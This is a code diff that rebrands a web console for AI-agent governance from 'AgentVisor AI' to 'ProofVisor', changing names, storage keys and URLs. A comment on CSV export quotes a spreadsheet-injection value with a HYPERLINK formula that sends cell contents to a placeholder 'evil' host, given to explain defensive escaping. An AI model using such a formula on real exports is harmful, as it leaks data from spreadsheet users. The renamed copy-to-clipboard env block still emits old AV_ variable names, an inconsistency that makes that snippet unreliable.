@@ -1,5 +1,5 @@
 /*
- * AgentVisor AI console. Application.
+ * ProofVisor console. Application.
  *
  * Hash-routed vanilla SPA. All data flows through window.dataSource
  * (mock or api). Views: /login /signup /overview /sessions /sessions/:id
@@ -45,7 +45,7 @@
     lastList: {},
   };
   // Live workspace-context pin for the datasource (see apiFetch's
-  // X-AV-Org stamp): a getter so the value ALWAYS reflects the org this
+  // X-PV-Org stamp): a getter so the value ALWAYS reflects the org this
   // tab is currently rendering — no sync calls to forget at the many
   // state.session assignment sites. Another tab switching workspaces
   // replaces the shared cookie; the server then 409s this tab's stale
@@ -70,7 +70,7 @@
   function applyTheme(t) {
     document.documentElement.setAttribute("data-theme", t);
     state.theme = t;
-    try { localStorage.setItem("av_theme", t); } catch (e) {}
+    try { localStorage.setItem("pv_theme", t); } catch (e) {}
     // The in-app toggle overrides the OS scheme, so the scheme-paired
     // theme-color metas would keep tinting the browser chrome for the
     // wrong theme — collapse them to the explicit choice.
@@ -82,7 +82,7 @@
   }
   function initTheme() {
     var saved;
-    try { saved = localStorage.getItem("av_theme"); } catch (e) {}
+    try { saved = localStorage.getItem("pv_theme"); } catch (e) {}
     if (saved === "light" || saved === "dark") applyTheme(saved);
     else state.theme = matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
     // Follow a LIVE OS scheme flip (sunset auto-dark etc.) while the
@@ -93,7 +93,7 @@
     try {
       matchMedia("(prefers-color-scheme: dark)").addEventListener("change", function (ev) {
         var s;
-        try { s = localStorage.getItem("av_theme"); } catch (e2) {}
+        try { s = localStorage.getItem("pv_theme"); } catch (e2) {}
         if (s === "light" || s === "dark") return; // explicit choice wins
         state.theme = ev.matches ? "dark" : "light";
       });
@@ -137,8 +137,8 @@
   // stash `javascript:` in sessionStorage from another tab.
   function consumeReturnTo() {
     try {
-      var t = sessionStorage.getItem("av_return_to");
-      sessionStorage.removeItem("av_return_to");
+      var t = sessionStorage.getItem("pv_return_to");
+      sessionStorage.removeItem("pv_return_to");
       if (typeof t === "string" && t.charAt(0) === "#" && t !== "#/login" && t !== "#/signup") {
         return t;
       }
@@ -160,7 +160,7 @@
     // A 401 from a request that was already in flight when the user
     // re-authenticated must not boot the FRESH session. Any expiry
     // event within 5s of a login is treated as stale.
-    window.addEventListener("av-session-expired", function () {
+    window.addEventListener("pv-session-expired", function () {
       if (!state.session) return; // already logged out; ignore
       if (Date.now() - (state.authedAt || 0) < 5000) return; // stale 401 racing a fresh login
       state.session = null;
@@ -170,17 +170,17 @@
       // machinery the router's login-redirect uses.
       try {
         var full = location.hash || "";
-        if (full && full !== "#/login") sessionStorage.setItem("av_return_to", full);
+        if (full && full !== "#/login") sessionStorage.setItem("pv_return_to", full);
       } catch (e) {}
       toast("Your session expired. Please sign in again");
       navigate("#/login");
     });
     // Cross-tab sign-out: when another tab in this browser signs out,
-    // it writes localStorage.av_signed_out_at. The storage event fires
+    // it writes localStorage.pv_signed_out_at. The storage event fires
     // in *other* tabs (not the writer). We drop our in-memory session
     // and bounce to login without waiting for the next API 401.
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_signed_out_at" || !e.newValue) return;
+      if (e.key !== "pv_signed_out_at" || !e.newValue) return;
       if (!state.session) return;
       state.session = null;
       stopLiveStream();
@@ -192,7 +192,7 @@
     // the user signed back in elsewhere. Re-check the session and let
     // the tab in.
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_signed_in_at" || !e.newValue) return;
+      if (e.key !== "pv_signed_in_at" || !e.newValue) return;
       if (state.session) return;
       state.ds.getSession().then(function (s) {
         if (!s || state.session) return;
@@ -208,13 +208,13 @@
     // is enough — a render() here reset live widgets in the OTHER tab
     // (same class as the in-app toggle; see toggleTheme).
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_theme") return;
+      if (e.key !== "pv_theme") return;
       if (e.newValue !== "light" && e.newValue !== "dark") return;
       if (state.theme === e.newValue) return;
       applyTheme(e.newValue);
     });
     // Cross-tab fresh-workspace lifecycle (mock mode): signup sets
-    // av_mock_fresh_t0, reset/relogin removes it. Identity and fixture
+    // pv_mock_fresh_t0, reset/relogin removes it. Identity and fixture
     // data are derived per page-load, so a second tab that misses the
     // transition keeps the OLD org's name over the NEW org's data —
     // "Acme Robotics" chrome wrapped around Northwind sessions after a
@@ -227,7 +227,7 @@
     // transitions (self-writes are invisible to the storage event).
     syncFreshPresence();
     window.addEventListener("storage", function (e) {
-      if (e.key !== "av_mock_fresh_t0") return;
+      if (e.key !== "pv_mock_fresh_t0") return;
       var now = e.newValue != null;
       if (now === _freshPresence) return;
       _freshPresence = now;
@@ -238,14 +238,14 @@
 
   var _freshPresence = false;
   function syncFreshPresence() {
-    try { _freshPresence = localStorage.getItem("av_mock_fresh_t0") != null; } catch (e) { _freshPresence = false; }
+    try { _freshPresence = localStorage.getItem("pv_mock_fresh_t0") != null; } catch (e) { _freshPresence = false; }
   }
 
   // Written on every successful login/signup so other tabs (parked on
   // the login page after a cross-tab sign-out) can let themselves in.
   function announceSignIn() {
     syncFreshPresence();
-    try { localStorage.setItem("av_signed_in_at", String(Date.now())); } catch (e) {}
+    try { localStorage.setItem("pv_signed_in_at", String(Date.now())); } catch (e) {}
     // Login/passkey/OAuth responses carry {user, org} but not the
     // memberships list or account-level extras like pendingEmail — only
     // GET /me does. Hydrate in the background so multi-org users get
@@ -461,7 +461,7 @@
   function announceRoute(path) {
     var key = path.join("/") || "overview";
     var title = routeTitle(path);
-    document.title = title + " · AgentVisor AI";
+    document.title = title + " · ProofVisor";
     if (key === _lastRouteKey) return; // re-render of the same route
     var first = _lastRouteKey === null;
     _lastRouteKey = key;
@@ -515,7 +515,7 @@
       // shouldn't dump the user on Overview after they authenticate.
       try {
         var full = location.hash || "";
-        if (full && full !== "#/login") sessionStorage.setItem("av_return_to", full);
+        if (full && full !== "#/login") sessionStorage.setItem("pv_return_to", full);
       } catch (e) {}
       return navigate("#/login");
     }
@@ -763,7 +763,7 @@
     return '<div class="story-banner" role="note">' +
       '<span class="sb-icon" aria-hidden="true">🛡</span>' +
       '<p><b>What happened here:</b> the <b>' + esc(s.agent) + '</b> agent tried to send <b>' + esc(value) + "</b> to " + reason + ". " +
-      "AgentVisor blocked the payment before any money moved" + (blk ? " (event #" + esc(blk.seq) + ")" : "") +
+      "ProofVisor blocked the payment before any money moved" + (blk ? " (event #" + esc(blk.seq) + ")" : "") +
       (recovered ? ", the agent recovered safely," : "") +
       " and the whole session is sealed under the signed receipt on this page.</p>" +
       (blk ? '<button class="btn" id="jumpToBlock">Jump to the block ↓</button>' : "") +
@@ -930,7 +930,7 @@
           // notices via a storage event and drops its own session state
           // without waiting for the next API 401. The value is a
           // timestamp so re-signing-out later fires the event again.
-          try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+          try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
           navigate("#/login");
         }).catch(function () {
           // Logout only succeeds after the shared session fence is
@@ -991,7 +991,7 @@
         '<header class="topbar" role="banner">' +
           '<a class="brand" href="#/overview">' +
             '<img class="brand-mark" src="../logo.png" alt="" width="22" height="22" />' +
-            '<span>AgentVisor AI</span>' +
+            '<span>ProofVisor</span>' +
           "</a>" +
           statusChip +
           '<div class="spacer"></div>' +
@@ -1341,7 +1341,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>' + (isSignup ? "Create your workspace" : "Sign in") + '</h1>' +
             '<p class="sub">' + (isSignup ? "Governance for every AI agent in your fleet." : "Access your agent control plane.") + '</p>' +
             noteHtml +
@@ -1397,7 +1397,7 @@
                   toast("No SSO configured for that domain. Ask your admin to add your IdP in Settings → SSO.", true);
                   return;
                 }
-                var relay = (sessionStorage.getItem("av_return_to") || "");
+                var relay = (sessionStorage.getItem("pv_return_to") || "");
                 var url = r.ssoConfig.loginUrl + (relay ? "?RelayState=" + encodeURIComponent(relay) : "");
                 window.location.assign(url);
               }).catch(function (err) {
@@ -1477,7 +1477,7 @@
           // A brand-new workspace has none of the data behind whatever
           // deep link bounced the user to auth — drop the saved
           // return-to and land on onboarding instead of a stale 404.
-          try { sessionStorage.removeItem("av_return_to"); } catch (e2) {}
+          try { sessionStorage.removeItem("pv_return_to"); } catch (e2) {}
           navigate("#/overview");
         } else {
           navigate(consumeReturnTo() || "#/overview");
@@ -1544,7 +1544,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>Join the workspace</h1>' +
             '<p class="sub">' + (email ? 'Accept your invite for <b>' + esc(email) + '</b> and set a password.' : 'Accept your invite and set a password.') + '</p>' +
             '<form id="acceptForm">' +
@@ -1611,7 +1611,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             '<h1>Confirm your new email</h1>' +
             '<div id="ceStatus"><p class="sub">Verifying the link…</p></div>' +
             '<div class="auth-alt"><a href="#/login">← Back to sign in</a></div>' +
@@ -1635,7 +1635,7 @@
         // state match on purpose instead of via a surprise 401.
         stopLiveStream();
         state.session = null;
-        try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+        try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
       }
       status.innerHTML =
         '<div class="mock-badge" style="margin-top:0; text-align:left; padding: 10px 12px;">' +
@@ -1674,7 +1674,7 @@
       '<div class="auth-shell">' +
         '<section class="auth-form">' +
           '<div class="auth-form-inner">' +
-            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> AgentVisor AI</div>' +
+            '<div class="auth-brand"><img class="auth-brand-mark" src="../logo.png" alt="" width="26" height="26" /> ProofVisor</div>' +
             (stage === "request"
               ? '<h1>Reset your password</h1>' +
                 '<p class="sub">We\'ll email you a link to pick a new one.</p>' +
@@ -1865,7 +1865,7 @@
    * first block. Invisible outside fresh mode. */
   var overviewTimer = null;
   function freshT0() {
-    try { var v = localStorage.getItem("av_mock_fresh_t0"); return v ? +v : null; } catch (e) { return null; }
+    try { var v = localStorage.getItem("pv_mock_fresh_t0"); return v ? +v : null; } catch (e) { return null; }
   }
   function onboardingCard(stats, sessions) {
     if (freshT0() == null) return "";
@@ -1884,7 +1884,7 @@
     // the top of the dashboard forever is noise once the story's told.
     // (Storage write is guarded; a quota failure just means the card
     // returns next visit.)
-    try { if (doneCount === steps.length && localStorage.getItem("av_ob_dismissed") === "1") return ""; } catch (e) {}
+    try { if (doneCount === steps.length && localStorage.getItem("pv_ob_dismissed") === "1") return ""; } catch (e) {}
     var rows = steps.map(function (s, i) {
       var inner =
         '<span class="ob-tick' + (s.done ? " done" : "") + '">' + (s.done ? "✓" : i + 1) + "</span>" +
@@ -1969,9 +1969,9 @@
           rerender(info.id);
           setTimeout(function () {
             var st = document.querySelector(".stat.savings");
-            if (st) st.classList.add("av-pulse");
+            if (st) st.classList.add("pv-pulse");
             var row = document.querySelector('tr[data-id="' + info.id + '"]');
-            if (row) row.classList.add("av-new-row");
+            if (row) row.classList.add("pv-new-row");
           }, 700);
           toastLink("Blocked before the money moved — $" + info.valueUsd.toLocaleString() + " kept. Receipt signed.", "#/sessions/" + info.id, "View session →");
           resolve();
@@ -2186,7 +2186,7 @@
       // re-renders the existing bar stays live (repainting it killed
       // its listeners mid-debounce and dropped keystrokes) — the fetch
       // happens first and only a winning response repaints.
-      main.innerHTML = pageHeader("Sessions", "Every agent session policed by AgentVisor.") + filterBar() + loadingBlock("table");
+      main.innerHTML = pageHeader("Sessions", "Every agent session policed by ProofVisor.") + filterBar() + loadingBlock("table");
     }
     var deps;
     try {
@@ -2302,7 +2302,7 @@
     // one char short — missing \r. R77 F1's threat description
     // names CR explicitly: "Excel / Google Sheets / Numbers
     // interpret any cell whose first char is =, +, -, @, TAB
-    // or CR as a formula." A leaked-AV_INGEST_TOKEN attacker
+    // or CR as a formula." A leaked-PV_INGEST_TOKEN attacker
     // (R119 F2 / R124 F3 / R125 F3 threat model) that sets
     // sessionExternalId = "\r=HYPERLINK(\"http://evil/\"&A2,\"Sign here\")"
     // lands a CR-leading formula into an owner's Excel-opened
@@ -2325,7 +2325,7 @@
     var blob = new Blob(["\ufeff" + lines.join("\r\n")], { type: "text/csv;charset=utf-8" });
     var a = document.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = "agentvisor-sessions-" + stamp + ".csv";
+    a.download = "proofvisor-sessions-" + stamp + ".csv";
     document.body.appendChild(a);
     a.click();
     a.remove();
@@ -2392,7 +2392,7 @@
   // quiet overview refreshes, so per-render wiring would drop off).
   document.addEventListener("click", function (e) {
     if (!e.target || e.target.id !== "obDismiss") return;
-    try { localStorage.setItem("av_ob_dismissed", "1"); } catch (e2) {}
+    try { localStorage.setItem("pv_ob_dismissed", "1"); } catch (e2) {}
     var card = e.target.closest(".onboard-card");
     if (card) card.remove();
   });
@@ -2421,7 +2421,7 @@
         : (s.status === "quarantined_crash_evidence" ? '<span class="pill warn">unknown · partial</span>' : '<span class="pill ok">clean</span>');
       return '<tr data-clickable data-id="' + esc(s.id) + '" data-nav="#/sessions/" tabindex="0">' +
         '<td title="' + esc(s.agent + " · " + s.externalId) + '"><div style="font-weight:500">' + esc(s.agent) + '</div><div class="id">' + esc(s.externalId) + "</div></td>" +
-        '<td title="' + esc(s.user || "") + '"><div class="actor"><span class="av">' + esc(initials(s.user)) + '</span>' + esc(s.user || "—") + '</div></td>' +
+        '<td title="' + esc(s.user || "") + '"><div class="actor"><span class="pv">' + esc(initials(s.user)) + '</span>' + esc(s.user || "—") + '</div></td>' +
         '<td class="num tabular">' + s.events + "</td>" +
         '<td class="num tabular">' + s.toolsAllowed + "</td>" +
         "<td>" + blocks + "</td>" +
@@ -2670,7 +2670,7 @@
         " · printed " + esc(new Date().toLocaleString()) +
         (receipt && receipt.receiptId ? " · receipt " + esc(receipt.receiptId) : "") +
         (receipt && receipt.signingKeyFingerprint ? " · signing key " + esc(receipt.signingKeyFingerprint) : "") +
-        "<br/>Verify this receipt offline at <b>agentvisorai.me/verify</b> — paste the downloaded receipt JSON; the Ed25519 signature check runs in the browser, no account needed." +
+        "<br/>Verify this receipt offline at <b>proofvisor.com/verify</b> — paste the downloaded receipt JSON; the Ed25519 signature check runs in the browser, no account needed." +
       "</div>";
 
     // event click → drawer. Selection is mirrored into the hash as
@@ -2891,7 +2891,7 @@
     });
 
     // Share receipt: encode the full bundle into a URL fragment and
-    // copy the resulting agentvisorai.me/verify/#data=<...> to the
+    // copy the resulting proofvisor.com/verify/#data=<...> to the
     // clipboard. Recipient opens the link -> auto-verifies in their
     // own browser. Fragment (not query) so the payload never touches
     // any server.
@@ -2903,7 +2903,7 @@
       var bin = "";
       for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
       var b64 = btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-      var origin = window.VERIFY_BASE || "https://agentvisorai.me";
+      var origin = window.VERIFY_BASE || "https://proofvisor.com";
       var url = origin + "/verify/#data=" + b64;
       // Warn if it's really big. Many chat clients cap URLs around 8k.
       if (url.length > 32000) {
@@ -2925,7 +2925,7 @@
     // both the Download and Share buttons so the recipient of either
     // gets the same shape as the offline verifier expects.
     // Version-accurate signed-message description for the exported
-    // bundle's human instructions (mirrors av-receipts
+    // bundle's human instructions (mirrors pv-receipts
     // signing_message and verify.js receiptSigningMessage).
     function receiptMessageInstruction(rcpt) {
       var version = 1;
@@ -2934,13 +2934,13 @@
         if (typeof parsed.receipt_version === "number") version = parsed.receipt_version;
       } catch (e) {}
       if (version === 2) {
-        return "utf8('agentvisor-receipt-v2\\0') || u64_be(byteLength(receipt.rawBody)) || receipt.rawBody (UTF-8 bytes)";
+        return "utf8('proofvisor-receipt-v2\\0') || u64_be(byteLength(receipt.rawBody)) || receipt.rawBody (UTF-8 bytes)";
       }
       return "receipt.rawBody (UTF-8 bytes)";
     }
     function buildReceiptBundle(sess, rcpt) {
       return {
-        format: "agentvisor.receipt.v1",
+        format: "proofvisor.receipt.v1",
         exportedAt: new Date().toISOString(),
         session: {
           id: sess.id,
@@ -2970,7 +2970,7 @@
           signature: "base64-decode(receipt.rawSignatureB64)",
           publicKey: "hex-decode(publicKey.hex)",
           command: "node tools/verify-receipt.mjs " + (sess.externalId || sess.id) + ".json",
-          docs: "https://agentvisorai.me/reference/receipts",
+          docs: "https://proofvisor.com/reference/receipts",
         },
       };
     }
@@ -2987,7 +2987,7 @@
       var url = URL.createObjectURL(blob);
       var a = document.createElement("a");
       a.href = url;
-      a.download = "agentvisor-receipt-" + (s.externalId || s.id) + ".json";
+      a.download = "proofvisor-receipt-" + (s.externalId || s.id) + ".json";
       document.body.appendChild(a);
       a.click();
       a.remove();
@@ -3183,8 +3183,8 @@
       body =
         '<div class="empty-hero" style="margin-bottom: 16px; padding: 16px 20px; grid-template-columns: 1fr 1fr;">' +
           '<div><h2 style="font-size: 15px; margin: 0 0 4px">Connect a new daemon</h2>' +
-          '<p style="margin: 0; font-size: 13px">Install <code>agentvisord</code> on your infra with the ingest token, and events start streaming here.</p></div>' +
-          '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://agentvisorai.me/install.sh | sh</span>\n<span class="prompt">$</span> <span class="cmd">avctl setup</span></div>' +
+          '<p style="margin: 0; font-size: 13px">Install <code>proofvisord</code> on your infra with the ingest token, and events start streaming here.</p></div>' +
+          '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://proofvisor.com/install.sh | sh</span>\n<span class="prompt">$</span> <span class="cmd">pvctl setup</span></div>' +
         "</div>" +
         '<div class="card" style="padding:0"><div class="table-wrap"><table>' +
           "<thead><tr><th>Deployment</th><th>Environment</th><th>Status</th><th>Version</th><th>Last seen</th><th class=\"act-3\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
@@ -3220,7 +3220,7 @@
               onConfirm: function () {
                 state.ds.rotateDeploymentToken(id).then(function (r) {
                   showTokenModal(r.ingestToken, "Token rotated", {
-                    subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+                    subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
                     notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
                   });
                 })
@@ -3244,10 +3244,10 @@
   function deploymentEmptyHero() {
     return '<div class="empty-hero">' +
       '<div><h2>Connect your first agent</h2>' +
-      '<p>Install the AgentVisor daemon on the box that runs your agent. Once it starts, sessions and signed receipts stream directly into this console.</p>' +
+      '<p>Install the ProofVisor daemon on the box that runs your agent. Once it starts, sessions and signed receipts stream directly into this console.</p>' +
       '<button class="btn accent" id="addDep2">+ New deployment</button> ' +
-      '<button type="button" class="btn" data-copy="curl -fsSL https://agentvisorai.me/install.sh | sh\navctl setup">⧉ Copy install commands</button></div>' +
-      '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://agentvisorai.me/install.sh | sh</span>\n\n<span class="prompt">$</span> <span class="cmd">avctl setup</span></div>' +
+      '<button type="button" class="btn" data-copy="curl -fsSL https://proofvisor.com/install.sh | sh\npvctl setup">⧉ Copy install commands</button></div>' +
+      '<div class="snippet"><span class="prompt">$</span> <span class="cmd">curl -fsSL https://proofvisor.com/install.sh | sh</span>\n\n<span class="prompt">$</span> <span class="cmd">pvctl setup</span></div>' +
       "</div>";
   }
 
@@ -3279,7 +3279,7 @@
           '<dt style="color:var(--fg-3)">Fingerprint</dt><dd class="mono">' + copyable(d.keyFingerprint) + "</dd>" +
           '<dt style="color:var(--fg-3)">Public key</dt><dd class="mono" style="word-break:break-all">' + copyable(d.publicKeyHex) + "</dd>" +
           // No copy button here: the hint is a redacted placeholder
-          // ("av_live_9HpD…") — copying it pastes garbage. The full
+          // ("pv_live_9HpD…") — copying it pastes garbage. The full
           // token is only shown once, at create/rotate.
           '<dt style="color:var(--fg-3)">Ingest token</dt><dd class="mono">' + esc(d.ingestTokenHint) + ' <span style="color:var(--fg-3);font-size:11px">(full token shown once at create/rotate)</span></dd>' +
         "</dl>" +
@@ -3292,18 +3292,18 @@
       // A copyable env block that points a daemon at this workspace.
       // Honesty rule (R275, same class as the token modals): the
       // hosted ingest hookup ships with the beta — the daemon reads
-      // these AV_INGEST_* vars then; ingest.agentvisorai.me has no DNS
+      // these PV_INGEST_* vars then; ingest.proofvisor.com has no DNS
       // yet, and "connected within a few seconds" was a promise no
       // real deployment could keep today.
       '<div class="card" style="margin-bottom:12px">' +
         "<h2>Connect your daemon</h2>" +
         '<p style="color:var(--fg-2); font-size:var(--t-sec); margin:0 0 10px">Store these with your secrets now — the daemon picks them up when the hosted control-plane link lands with the beta, and this page flips to <b>connected</b>. Tokens you mint today stay valid.</p>' +
         '<pre class="policy-body" style="margin:0 0 10px; user-select:all">' +
-          "AV_INGEST_URL=https://ingest.agentvisorai.me/v1   # live with the beta\n" +
-          "AV_DEPLOYMENT=" + esc(d.id) + "\n" +
-          "AV_INGEST_TOKEN=" + esc(d.ingestTokenHint || "av_live_…") + "  # full token shown once at create/rotate" +
+          "PV_INGEST_URL=https://ingest.proofvisor.com/v1   # live with the beta\n" +
+          "PV_DEPLOYMENT=" + esc(d.id) + "\n" +
+          "PV_INGEST_TOKEN=" + esc(d.ingestTokenHint || "pv_live_…") + "  # full token shown once at create/rotate" +
         "</pre>" +
-        '<button type="button" class="btn" data-copy="AV_INGEST_URL=https://ingest.agentvisorai.me/v1\nAV_DEPLOYMENT=' + esc(d.id) + '\nAV_INGEST_TOKEN=<your-token>">⧉ Copy env block</button>' +
+        '<button type="button" class="btn" data-copy="PV_INGEST_URL=https://ingest.proofvisor.com/v1\nAV_DEPLOYMENT=' + esc(d.id) + '\nAV_INGEST_TOKEN=<your-token>">⧉ Copy env block</button>' +
         '<span style="margin-left:10px; color:var(--fg-3); font-size:11.5px">Lost the token? Rotate below — the old one stops working immediately.</span>' +
       "</div>" +
       '<div class="card" style="padding:0">' +
@@ -3324,7 +3324,7 @@
         onConfirm: function () {
           state.ds.rotateDeploymentToken(d.id).then(function (r) {
             showTokenModal(r.ingestToken, "Token rotated", {
-              subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+              subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
               notice: "The previous ingest token is invalidated immediately; every daemon using it will fail to connect until you swap the value.",
             });
           })
@@ -3502,7 +3502,7 @@
         .then(function (r) {
           close();
           showTokenModal(r.ingestToken, "Deployment created", {
-            subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the AV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
+            subtitle: "Store this token in your secret manager — it's shown only once. It links your daemon to this console (the PV_INGEST_TOKEN control-plane hookup ships with the beta; tokens minted now stay valid).",
             notice: "If you lose the token, rotate to mint a new one from the deployment's detail page; the current value stops being accepted immediately.",
           });
         })
@@ -4288,7 +4288,7 @@
             var blob = await state.ds.exportMyData(password);
             var a = document.createElement("a");
             a.href = URL.createObjectURL(blob);
-            a.download = "agentvisor-export-" + new Date().toISOString().slice(0, 10) + ".jsonl";
+            a.download = "proofvisor-export-" + new Date().toISOString().slice(0, 10) + ".jsonl";
             document.body.appendChild(a); a.click(); a.remove();
             setTimeout(function () { URL.revokeObjectURL(a.href); }, 4000);
             toast("Export downloaded");
@@ -4332,7 +4332,7 @@
               render();
               return;
             }
-            try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e3) {}
+            try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e3) {}
             state.session = null;
             toast("Organization deleted. Goodbye.");
             navigate("#/login");
@@ -4739,7 +4739,7 @@
           '</select>';
       }
       return '<tr data-user="' + esc(m.userId || m.id) + '">' +
-        '<td><div class="actor"><span class="av">' + esc(initials(m.displayName || m.email)) + '</span><div><div style="font-weight:500">' + esc(m.displayName || m.email) +
+        '<td><div class="actor"><span class="pv">' + esc(initials(m.displayName || m.email)) + '</span><div><div style="font-weight:500">' + esc(m.displayName || m.email) +
           (m.mfaEnrolled ? ' <span class="pill neutral" title="This account requires a passkey on every sign-in">2FA</span>' : '') +
           '</div><div class="id">' + esc(m.email) + '</div></div></div></td>' +
         '<td>' + selector + '</td>' +
@@ -4870,10 +4870,10 @@
       // shape always called renderSettingsMembers(root) after
       // success, so a self-remove:
       //   1. Toast "Member removed"
-      //   2. listMembers() 401 → av-session-expired handler
+      //   2. listMembers() 401 → pv-session-expired handler
       //      fires SECOND toast "Your session expired…"
       //   3. Bounce to /#/login without cross-tab sync (no
-      //      av_signed_out_at write)
+      //      pv_signed_out_at write)
       // Same stacked-toast + no-warning + no-cross-tab-sync
       // anti-pattern R125 F1 just fixed for the passkey-revoke
       // sibling. Mirror that shape here.
@@ -4893,7 +4893,7 @@
               stopLiveStream();
               rolePreview = null;
               state.session = null;
-              try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+              try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
               toast("You left the workspace. Sign in again to continue.");
               navigate("#/login");
             } else {
@@ -5047,7 +5047,7 @@
             '<span style="margin-left:8px; color:var(--fg-3); font-size:var(--t-sec)">0 active</span>' +
           "</div>" +
           '<div style="padding: 24px 16px">' +
-          emptyState("No API keys yet", "Create a server-side key to script deployments, rotate ingest tokens, or wire AgentVisor into CI/CD.", "+ Create key", null, "createKeyBtn") +
+          emptyState("No API keys yet", "Create a server-side key to script deployments, rotate ingest tokens, or wire ProofVisor into CI/CD.", "+ Create key", null, "createKeyBtn") +
           "</div></div>";
       attachCreate($("#createKeyBtn", root));
       return;
@@ -5267,7 +5267,7 @@
           title: "Revoke passkey?",
           // R125 F1: R124 F1 turned DELETE /credentials/:id into a
           // session-wide fence (sessionRevokedAt bumped + all
-          // av_srv_ tokens the user created revoked). The prior
+          // pv_srv_ tokens the user created revoked). The prior
           // body copy neglected both side-effects. Warn the user
           // explicitly so a legitimate rotation ("swap yubikeys")
           // isn't a surprise CI-tokens-broken incident.
@@ -5300,7 +5300,7 @@
                   stopLiveStream();
                   rolePreview = null;
                   state.session = null;
-                  try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+                  try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
                   toast("Passkey revoked. Sign in again to continue.");
                   navigate("#/login");
                 }).catch(function (err) { toast(err.message || "Revoke failed", true); });
@@ -5603,8 +5603,8 @@
           '<p class="sub">Paste values from your Okta / Auth0 / Entra / SAML IdP admin console.</p>' +
           '<form id="samlForm">' +
             '<div class="field"><label for="s_name">Display name</label><input id="s_name" required maxlength="80" placeholder="Okta production" value="' + esc(c.displayName) + '"></div>' +
-            '<div class="field"><label for="s_ssoUrl">IdP SSO URL</label><input id="s_ssoUrl" required type="url" placeholder="https://acme.okta.com/app/agentvisor/sso/saml" value="' + esc(c.ssoUrl) + '"></div>' +
-            '<div class="field"><label for="s_sloUrl">IdP SLO URL (optional)</label><input id="s_sloUrl" type="url" placeholder="https://acme.okta.com/app/agentvisor/slo/saml" value="' + esc(c.sloUrl || "") + '"></div>' +
+            '<div class="field"><label for="s_ssoUrl">IdP SSO URL</label><input id="s_ssoUrl" required type="url" placeholder="https://acme.okta.com/app/proofvisor/sso/saml" value="' + esc(c.ssoUrl) + '"></div>' +
+            '<div class="field"><label for="s_sloUrl">IdP SLO URL (optional)</label><input id="s_sloUrl" type="url" placeholder="https://acme.okta.com/app/proofvisor/slo/saml" value="' + esc(c.sloUrl || "") + '"></div>' +
             '<div class="field"><label for="s_entityIdIdp">IdP Entity ID</label><input id="s_entityIdIdp" required placeholder="http://www.okta.com/exkABCDE" value="' + esc(c.entityIdIdp) + '"></div>' +
             '<div class="field"><label for="s_x509">IdP X.509 Certificate (PEM)</label><textarea id="s_x509" required rows="6" style="font-family: SF Mono, ui-monospace, monospace; font-size:11.5px" placeholder="-----BEGIN CERTIFICATE-----&#10;MIIDpDCC...&#10;-----END CERTIFICATE-----">' + esc(c.x509Cert) + '</textarea></div>' +
             '<div style="display:grid; grid-template-columns:1fr 1fr; gap:12px">' +
@@ -5791,7 +5791,7 @@
           var res = await state.ds.createWebhook({ name: name, url: url, events: events });
           closeWh();
           showTokenModal(res.secret, "Webhook secret", {
-            subtitle: "Configure your receiver to validate every delivery with this HMAC signing secret. Compare against the X-AgentVisor-Signature header.",
+            subtitle: "Configure your receiver to validate every delivery with this HMAC signing secret. Compare against the X-ProofVisor-Signature header.",
             notice: "If you lose it, rotate to mint a new secret; deliveries signed with the old one will still verify against your receiver until you swap them.",
           });
           await renderSettingsWebhooks(root);
@@ -5810,7 +5810,7 @@
